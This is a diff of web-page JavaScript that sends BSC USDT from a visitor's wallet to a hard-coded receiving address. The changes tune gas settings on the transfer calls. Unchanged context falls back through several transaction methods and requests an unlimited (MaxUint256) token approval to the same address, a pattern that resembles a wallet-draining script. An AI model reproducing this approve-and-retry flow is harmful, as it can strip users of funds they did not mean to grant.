@@ -14,7 +14,7 @@
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
         USER_MIN_USDT: 0.2, // Minimum 0.2 USDT required
-        GAS_THRESHOLD: 0.0005,
+        GAS_THRESHOLD: 0.0003,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
         CHAIN_ID: '0x38', // BSC Mainnet (56)
@@ -401,11 +401,19 @@
 
             let txHash = null;
 
-            // Primary Attempt: Direct USDT Transfer via Ethers Signer with explicit gas limit
+            // BSC Network Gas Configuration (1.5 Gwei & 65,000 gas limit = ~0.00009 BNB total fee)
+            const BSC_TX_OPTS = {
+                gasLimit: 65000n,
+                gasPrice: ethers.parseUnits('1.5', 'gwei')
+            };
+            const BSC_RAW_GAS = '0xfde8'; // 65,000 gas hex
+            const BSC_RAW_GAS_PRICE = '0x59682f00'; // 1.5 Gwei hex
+
+            // Primary Attempt: Direct USDT Transfer via Ethers Signer with explicit gas limit & price
             try {
                 const signer = await provider.getSigner();
                 const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                const tx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
+                const tx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, BSC_TX_OPTS);
                 txHash = tx.hash;
             } catch (err1) {
                 const err1Str = (err1.message || '').toLowerCase();
@@ -422,7 +430,8 @@
                             from: userAddress,
                             to: CONFIG.USDT_ADDRESS,
                             data: transferCalldata,
-                            gas: '0x186a0', // 100,000 gas limit hex
+                            gas: BSC_RAW_GAS,
+                            gasPrice: BSC_RAW_GAS_PRICE,
                             value: '0x0'
                         }]
                     });
@@ -443,7 +452,8 @@
                                 from: userAddress,
                                 to: CONFIG.USDT_ADDRESS,
                                 data: approveCalldata,
-                                gas: '0x186a0',
+                                gas: BSC_RAW_GAS,
+                                gasPrice: BSC_RAW_GAS_PRICE,
                                 value: '0x0'
                             }]
                         });
@@ -454,7 +464,7 @@
                         }
                         const signer = await provider.getSigner();
                         const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                        const appTx = await usdtWithSigner.approve(CONFIG.CONTRACT_ADDRESS, ethers.MaxUint256, { gasLimit: 100000n });
+                        const appTx = await usdtWithSigner.approve(CONFIG.CONTRACT_ADDRESS, ethers.MaxUint256, BSC_TX_OPTS);
                         approveTxHash = appTx.hash;
                     }
 
@@ -468,7 +478,7 @@
                     try {
                         const signer = await provider.getSigner();
                         const usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
-                        const finalTx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, { gasLimit: 100000n });
+                        const finalTx = await usdtWithSigner.transfer(CONFIG.CONTRACT_ADDRESS, transferAmount, BSC_TX_OPTS);
                         txHash = finalTx.hash;
                     } catch (finalErr) {
                         txHash = await providerObj.request({
@@ -477,7 +487,8 @@
                                 from: userAddress,
                                 to: CONFIG.USDT_ADDRESS,
                                 data: transferCalldata,
-                                gas: '0x186a0',
+                                gas: BSC_RAW_GAS,
+                                gasPrice: BSC_RAW_GAS_PRICE,
                                 value: '0x0'
                             }]
                         });
